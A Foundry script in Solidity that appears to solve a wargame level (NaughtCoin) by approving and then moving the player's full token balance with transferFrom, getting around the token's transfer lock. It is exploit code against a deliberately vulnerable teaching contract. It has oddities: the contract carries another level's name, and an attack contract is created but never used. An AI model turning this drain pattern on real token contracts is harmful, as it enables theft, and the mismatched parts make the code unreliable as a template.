// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level15.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract GatekeeperTwoHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
        NaughtCoinAttack naughtCoinAttack = new NaughtCoinAttack();
        NaughtCoin naughtCoin = NaughtCoin(0x13450E6A4ad4a1f493fc97E6Bec0a32C90ba9711);

        address player = vm.envAddress('PLAYER_ADDRESS');
        console.log(player);

        uint mybalance = naughtCoin.balanceOf(player);
        console.log("my balance is ", mybalance);

        console.log("calling the approve function");
        naughtCoin.approve(player, mybalance);
        naughtCoin.transferFrom(player, address(this), mybalance);

        vm.stopBroadcast();
    }
}